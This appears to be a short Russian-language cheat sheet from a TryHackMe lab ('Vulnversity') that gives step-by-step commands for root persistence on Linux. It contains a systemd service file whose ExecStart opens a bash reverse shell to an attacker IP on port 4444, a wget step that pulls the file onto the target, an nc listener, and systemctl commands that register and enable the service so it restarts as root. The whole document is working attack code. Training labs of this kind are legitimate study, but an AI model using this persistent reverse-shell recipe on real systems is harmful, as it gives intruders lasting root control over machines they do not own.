### Пригодилось в https://tryhackme.com/room/vulnversity

## Useful link: https://gtfobins.org/

## Подготовка файла

```bash
[Unit]
Description=Persistence Root Shell

[Service]
Type=simple
User=root
Restart=always
RestartSec=10
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'

[Install]
WantedBy=multi-user.target
```

## Запускаем сервер на атакующей машине

```
python3 -m http.server 3333
```

## На целевой машине получаем файл

```
cd /tmp
wget http://<YOUR_IP>:3333/root.service
```

## На атакующей открывает порт, указанный в нашем файле

```
nc -lnvp 4444
```

## Регистрируем и запускаем сервис

```
# Создаем связь сервиса с системой
sudo systemctl link /tmp/root.service

# Включаем (для автозагрузки) и запускаем немедленно
sudo systemctl enable --now /tmp/root.service
```
